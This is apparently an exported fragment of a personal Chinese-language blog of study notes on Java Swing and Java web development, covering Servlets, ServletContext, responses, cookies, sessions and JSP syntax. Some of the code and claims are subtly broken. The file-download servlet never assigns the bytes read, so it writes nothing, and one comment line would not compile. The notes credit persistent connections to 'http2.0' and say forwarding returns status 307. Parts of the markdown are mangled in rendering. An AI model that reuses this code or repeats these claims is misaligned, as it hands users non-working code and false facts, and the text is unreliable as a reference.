       System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//设置滚动条一直显示</span></span><br><span class="line">        jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);</span><br><span class="line">        jFrame.add(jLabel);</span><br><span class="line">        jFrame.add(jTextField);</span><br><span class="line">        jFrame.add(Browse);</span><br><span class="line">        jFrame.add(jScrollPane);</span><br><span class="line">        jFrame.add(Clear);</span><br><span class="line">        jFrame.add(Read);</span><br><span class="line">        jFrame.add(Save);</span><br><span class="line">        jFrame.add(Exit);</span><br><span class="line">        jFrame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211229002852293.png" alt="image-20211229002852293" style="zoom:67%;" />
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>UI</tag>
      </tags>
  </entry>
  <entry>
    <title>java_web</title>
    <url>/2022/01/11/java-web/</url>
    <content><![CDATA[<p>http1.0:客户端与web服务器连接后,只能获得一个web资源,断开连接</p>
<p>http2.0: 客户端与web服务器连接后,可以获得多个web资源</p>
<span id="more"></span>

<h5 id="Http响应"><a href="#Http响应" class="headerlink" title="Http响应"></a>Http响应</h5><p>响应状态码</p>
<p>200: 请求响应成功</p>
<p>3**: 请求重定向</p>
<p>4**: 找不到资源</p>
<p>5**: 服务器代码错误500 502(网关错误)</p>
<h5 id="MAVEN环境配置"><a href="#MAVEN环境配置" class="headerlink" title="MAVEN环境配置"></a>MAVEN环境配置</h5><p>M2_HOME   maven目录下的bin目录</p>
<p>MAVEN_HOME  maven目录</p>
<p>path中配置  %MAVEN_HOME%\bin</p>
<h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><h5 id="Servlet简介"><a href="#Servlet简介" class="headerlink" title="Servlet简介"></a>Servlet简介</h5><p>要在web.xml中导包</p>
<ul>
<li>Servlet就是sun公司开发动态web的一门技术</li>
<li>Sun在这些API中提供一个接口叫做:Servlet,如果你想开发一个Servlet程序,只需要完成两个小步骤:<ul>
<li>编写一个类,实现Servlet接口</li>
<li>把开发好的java类部署到web服务器中</li>
</ul>
</li>
</ul>
<p>HelloServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter writer=resp.getWriter();<span class="comment">//响应流</span></span><br><span class="line">        writer.println(<span class="string">&quot;hello,Servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目录结构</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113162720716.png" alt="image-20220113162720716"></p>
<h5 id="编写Servlet映射"><a href="#编写Servlet映射" class="headerlink" title="编写Servlet映射"></a>编写Servlet映射</h5><p>写的是java程序,但是要通过浏览器访问,而浏览器需要连接web服务器,所以我们需要在web服务中注册我们写的servlet,还需要给它一个浏览器能够访问的路径</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113162502747.png" alt="image-20220113162502747"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113162617543.png" alt="image-20220113162617543"></p>
<p>请求/hello后,会在web.xml中找/hello对应的servlet-name  hello,然后再向上找hello对应的servlet-class</p>
<h5 id="servlet原理"><a href="#servlet原理" class="headerlink" title="servlet原理"></a>servlet原理</h5><p>本质上就是requset调用servlet中的service抽象类中我们自己实现的方法,再返回给servlet</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113163642745.png" alt="image-20220113163642745"></p>
<h5 id="Mapping问题"><a href="#Mapping问题" class="headerlink" title="Mapping问题"></a>Mapping问题</h5><ul>
<li><p>一个servlet可以指定一个或者多个路径,(本质上都是请求同一个class)</p>
</li>
<li><p>一个servlet可以指定通用(默认)映射路径</p>
<ul>
<li>```xml<servlet-mapping>
    <servlet-name>hello</servlet-name>
    <url-pattern>/hello/*</url-pattern>  <!--请求hello/下的都会请求到hello-->
</servlet-mapping>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 默认请求路径(等于替代掉了index吧....)</span><br><span class="line"></span><br><span class="line">  - ```xml</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">    	&lt;servlet-name&gt;hello&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;!--默认请求到hello--&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>可以自定义后缀实现请求映射(类似于正则)</p>
<ul>
<li>```xml<servlet-mapping>
    <servlet-name>hello</servlet-name>
    <url-pattern>*.abcd</url-pattern>  <!--只要请求后缀有abcd都会映射到hello-->
</servlet-mapping>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">#### ServletContext</span><br><span class="line"></span><br><span class="line">web容器在启动的时候,它会为每个web程序都创建一个对应的ServletContext对象,它代表了当前的web应用</span><br><span class="line"></span><br><span class="line">##### 共享数据</span><br><span class="line"></span><br><span class="line">很像android中页面传参的intent.putExtra和intent.getExtra</span><br><span class="line"></span><br><span class="line">- 在一个servlet中保存的数据,可以在另外一个servlet中拿到</span><br><span class="line"></span><br><span class="line">有一说一,java万物皆对象的思想确实牛逼,继承了直接就可以用父类方法,不同子类还能互动</span><br><span class="line"></span><br><span class="line">![image-20220113173732922](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113173732922.png)</span><br><span class="line"></span><br><span class="line">![image-20220113173739121](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113173739121.png)</span><br><span class="line"></span><br><span class="line">![image-20220113173749274](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113173749274.png)</span><br><span class="line"></span><br><span class="line">![image-20220113173756430](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113173756430.png)</span><br><span class="line"></span><br><span class="line">注意点:因为setAttribute写在了helloServlet中的doGet里面,所以要先请求一下/hello,再去请求/getname</span><br><span class="line"></span><br><span class="line">记得类型转换为String</span><br><span class="line"></span><br><span class="line">##### 获取初始化参数</span><br><span class="line"></span><br><span class="line">web.xml中</span><br><span class="line"></span><br><span class="line">```xml</span><br><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;url&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;jdbc:mysql//localhost:3306/mybatis&lt;/param-value&gt;</span><br><span class="line">&lt;/context-param&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>java类里面</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">    resp.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    ServletContext context=<span class="keyword">this</span>.getServletContext();</span><br><span class="line">    String url = context.getInitParameter(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    resp.getWriter().print(url)        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求对应页面会打印出jdbc:mysql//localhost:3306/mybatis</p>
<h5 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dispatcher</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        ServletContext context= <span class="keyword">this</span>.getServletContext();</span><br><span class="line">        context.getRequestDispatcher(<span class="string">&quot;/hello&quot;</span>).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求sd就等于请求了/hello,并且浏览器状态码为200,不是3**的重定向</p>
<p>我觉得对于安全性来说很好,A请求B,B可以去请求C的内容,虽然A得到了C的内容,但是A永远只和B交流</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113222128264.png" alt="image-20220113222128264"></p>
<h5 id="读取资源-配置-文件"><a href="#读取资源-配置-文件" class="headerlink" title="读取资源(配置)文件"></a>读取资源(配置)文件</h5><p>Properties</p>
<ul>
<li>在java目录下新建properties</li>
<li>在resources目录下新建properties</li>
</ul>
<p>发现:都被打包到了同一个路径下:classes,俗称这个路径为classpath</p>
<p>需要一个文件流</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="HttpServletResponse"><a href="#HttpServletResponse" class="headerlink" title="HttpServletResponse"></a>HttpServletResponse</h3><p>web服务器接收到客户端的http请求,针对这个请求,分别创建一个代表请求的HttpServletRequest对象,代表响应的一个HttpServletResponse对象</p>
<p>获取客户端请求过来的参数,找HttpServletRequest</p>
<p>如果要给客户端响应信息,找HttpServletResponse</p>
<h4 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> SC_CONTINUE = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_SWITCHING_PROTOCOLS = <span class="number">101</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_OK = <span class="number">200</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_CREATED = <span class="number">201</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_ACCEPTED = <span class="number">202</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NON_AUTHORITATIVE_INFORMATION = <span class="number">203</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NO_CONTENT = <span class="number">204</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_RESET_CONTENT = <span class="number">205</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PARTIAL_CONTENT = <span class="number">206</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_MULTIPLE_CHOICES = <span class="number">300</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_MOVED_PERMANENTLY = <span class="number">301</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_MOVED_TEMPORARILY = <span class="number">302</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_FOUND = <span class="number">302</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_SEE_OTHER = <span class="number">303</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_MODIFIED = <span class="number">304</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_USE_PROXY = <span class="number">305</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_TEMPORARY_REDIRECT = <span class="number">307</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_BAD_REQUEST = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_UNAUTHORIZED = <span class="number">401</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PAYMENT_REQUIRED = <span class="number">402</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_FORBIDDEN = <span class="number">403</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_FOUND = <span class="number">404</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_METHOD_NOT_ALLOWED = <span class="number">405</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_ACCEPTABLE = <span class="number">406</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PROXY_AUTHENTICATION_REQUIRED = <span class="number">407</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUEST_TIMEOUT = <span class="number">408</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_CONFLICT = <span class="number">409</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_GONE = <span class="number">410</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_LENGTH_REQUIRED = <span class="number">411</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_PRECONDITION_FAILED = <span class="number">412</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUEST_ENTITY_TOO_LARGE = <span class="number">413</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUEST_URI_TOO_LONG = <span class="number">414</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_UNSUPPORTED_MEDIA_TYPE = <span class="number">415</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_REQUESTED_RANGE_NOT_SATISFIABLE = <span class="number">416</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_EXPECTATION_FAILED = <span class="number">417</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_INTERNAL_SERVER_ERROR = <span class="number">500</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_NOT_IMPLEMENTED = <span class="number">501</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_BAD_GATEWAY = <span class="number">502</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_SERVICE_UNAVAILABLE = <span class="number">503</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_GATEWAY_TIMEOUT = <span class="number">504</span>;</span><br><span class="line">    <span class="keyword">int</span> SC_HTTP_VERSION_NOT_SUPPORTED = <span class="number">505</span>;</span><br></pre></td></tr></table></figure>

<h4 id="常见应用"><a href="#常见应用" class="headerlink" title="常见应用"></a>常见应用</h4><h5 id="1-向浏览器输出消息"><a href="#1-向浏览器输出消息" class="headerlink" title="1.向浏览器输出消息"></a>1.向浏览器输出消息</h5><p>getWriter(),getOutputStream()</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220113224928187.png" alt="image-20220113224928187"></p>
<h5 id="2-下载文件"><a href="#2-下载文件" class="headerlink" title="2.下载文件"></a>2.下载文件</h5><ol>
<li>要获取下载文件路径</li>
<li>下载文件名是啥</li>
<li>设置想办法让浏览器能够支持下载我们需要的东西</li>
<li>获取下载文件的输入流</li>
<li>创建缓冲区</li>
<li>获取OutputStream对象</li>
<li>将FileOutputStream流写入到buffer缓冲区</li>
<li>使用OutputStream将缓冲区中的数据输出到客户端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">down</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String realPath=<span class="string">&quot;F:\\Project\\maven\\maven_web_1\\src\\main\\resources\\img.png&quot;</span>;</span><br><span class="line">        <span class="comment">//2.获取下载文件名</span></span><br><span class="line">        String filename=realPath.substring(realPath.lastIndexOf(<span class="string">&quot;\\&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//3.设置头</span></span><br><span class="line">        /中文文件名的话还要设置编码</span><br><span class="line">        resp.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>,<span class="string">&quot;attachment;filename=&quot;</span>+filename);</span><br><span class="line">        <span class="comment">//4.获取下载文件的输入流</span></span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> FileInputStream(realPath);</span><br><span class="line">        <span class="comment">//5.创建缓冲区</span></span><br><span class="line">        <span class="keyword">int</span> len=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] buffer=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">//6.获取OutputStream对象</span></span><br><span class="line">        ServletOutputStream out=resp.getOutputStream();</span><br><span class="line">        <span class="comment">//7.将fileOutputStream流写入到buffer缓冲区,使用OutputStream将缓冲区中的数据输出到客户端</span></span><br><span class="line">        <span class="keyword">while</span> (in.read(buffer)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="实现网页重定向"><a href="#实现网页重定向" class="headerlink" title="实现网页重定向"></a>实现网页重定向</h4><p>不同于servlet的资源请求重定向,response是通过浏览器实现的重定向</p>
<p><code>resp.sendRedirect(&quot;路径&quot;);</code></p>
<p><code>&amp;&#123;pageContext.request.contextPath&#125;</code>代表当前项目路径</p>
<p>重定向和转发的区别:</p>
<p>编码:转发307,重定向302</p>
<p>相同点:页面都会跳转</p>
<p>不同点:url变与不变</p>
<h3 id="HttpServletRequest"><a href="#HttpServletRequest" class="headerlink" title="HttpServletRequest"></a>HttpServletRequest</h3><p>通过HttpServletRequest获取客户端的信息</p>
<p>获取前端提交的参数</p>
<p><code>req.getParameter(&quot;username&quot;);</code></p>
<p><code>getParamaterValues();</code>返回一个字符数组</p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><ul>
<li>一个Cookie只能保存一个信息</li>
<li>一个web站点可以给浏览器发送多个cookie,最多存放20个cookie</li>
<li>cookie大小有限制4kb</li>
<li>300个cookie浏览器上限</li>
</ul>
<p>删除Cookie</p>
<ul>
<li>不设置有效期,关闭浏览器,自动失效</li>
<li>设置有效期为0</li>
</ul>
<p>传递中文记得使用URLEncoder.encode(“中文”,”utf-8”);</p>
<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><ul>
<li>服务器会给每一个用户(浏览器)创建一个Session对象</li>
<li>一个Session独占一个浏览器,只要浏览器没有关闭,这个Session就存在</li>
<li>用户登录之后,整个网站它都可以访问</li>
</ul>
<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><p>JAVA Server Pages</p>
<p>最大特点:</p>
<ul>
<li>写JSP就像在写HTML</li>
<li>区别:<ul>
<li>HTML静态数据</li>
<li>JSP页面可以嵌入JAVA代码,为用户提供动态数据</li>
</ul>
</li>
</ul>
<p>JSP本质上就是Servlet</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220114211237653.png" alt="image-20220114211237653"  />

<h5 id="jsp与对应jsp-java转换关系"><a href="#jsp与对应jsp-java转换关系" class="headerlink" title="jsp与对应jsp.java转换关系"></a>jsp与对应jsp.java转换关系</h5><p>只要是java代码就原封不动的输出</p>
<p>如果是HTML代码,就会被转换为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out.write(&quot;&lt;xxxxxxx&gt;&quot;)</span><br></pre></td></tr></table></figure>



<h4 id="JSP基础语法"><a href="#JSP基础语法" class="headerlink" title="JSP基础语法"></a>JSP基础语法</h4><p>开始前要先导入依赖,<a href="https://mvnrepository.com/">maven依赖在线查询</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--Servlet依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--JSP依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--JSTL表达式的依赖--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.glassfish.web<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--standard标签库--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/taglibs/standard --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><h5 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%=变量或者表达式%&gt;</span><br><span class="line">&lt;%=<span class="keyword">new</span> java.util.Date()%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以用${变量名}(EL表达式)代替,更高级,并且会将一些错误默认不显示,比如不存在的变量</p>
<h5 id="脚本片段"><a href="#脚本片段" class="headerlink" title="脚本片段"></a>脚本片段</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	java脚本片段</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> globalVar = <span class="number">0</span>;    </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>会被编译到jsp生成的java类中,其他的会被生成到对应的java文件中的jspService方法中</p>
<h5 id="在代码中嵌入HTML元素"><a href="#在代码中嵌入HTML元素" class="headerlink" title="在代码中嵌入HTML元素"></a>在代码中嵌入HTML元素</h5><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">    %&gt;</span><br><span class="line">    &lt;h1&gt;hello,world &lt;%=i%&gt; &lt;/h1&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220115211903441.png" alt="image-20220115211903441" style="zoom:80%;" />

<h3 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h3><h5 id="配置错误页面-lt-page-args…-gt"><a href="#配置错误页面-lt-page-args…-gt" class="headerlink" title="配置错误页面&lt;%@page  args…%&gt;"></a>配置错误页面&lt;%@page  args…%&gt;</h5><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220115215532167.png" alt="image-20220115215532167"></p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> errorPage=<span class="string">&quot;error/500.jsp&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>

<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>修改web.xml</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220115215913478.png" alt="image-20220115215913478"></p>
<h5 id="lt-include-file-””-gt"><a href="#lt-include-file-””-gt" class="headerlink" title="&lt;%@include file=””%&gt;"></a>&lt;%@include file=””%&gt;</h5><h4 id="九大内置对象"><a href="#九大内置对象" class="headerlink" title="九大内置对象"></a>九大内置对象</h4><ul>
<li>pageContext     存东西    还可以forward()转发请求</li>
<li>request    存东西</li>
<li>Response</li>
<li>Session    存东西</li>
<li>Application      (ServletContext)存东西</li>
<li>config            (ServletConfig)</li>
<li>out</li>
<li>page    用来导包</li>
<li>exception</li>
</ul>
<p>对象设置的值的作用域和时间比较</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字1&quot;</span>);<span class="comment">//保存的数据只在一个页面中有效(它有个scope参数,可以修改作用域)</span></span><br><span class="line">    request.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字2&quot;</span>);<span class="comment">//保存的数据只在一次请求中有效,请求转发会携带这个数据</span></span><br><span class="line">    session.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字3&quot;</span>);<span class="comment">//保存的数据只在一次会话中有效,从打开浏览器到关闭浏览器</span></span><br><span class="line">    application.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;名字4&quot;</span>);<span class="comment">//保存的数据只在服务器中有效,从打开服务器到关闭服务器</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>一些应用场景</p>
<p>request:客户端向服务器发送请求,产生的数据,用户看完就没用了,比如,新闻</p>
<p>session:客户端向服务器发送请求,产生的数据,用户看完还有用</p>
<p>application:客户端向服务器发送请求,产生的数据,一个用户用完了,其他用户还可能用,比如:聊天数据</p>
<h3 id="JSP标签-JSTL标签-EL表达式"><a href="#JSP标签-JSTL标签-EL表达式" class="headerlink" title="JSP标签,JSTL标签,EL表达式"></a>JSP标签,JSTL标签,EL表达式</h3><p>需要导入两个包</p>
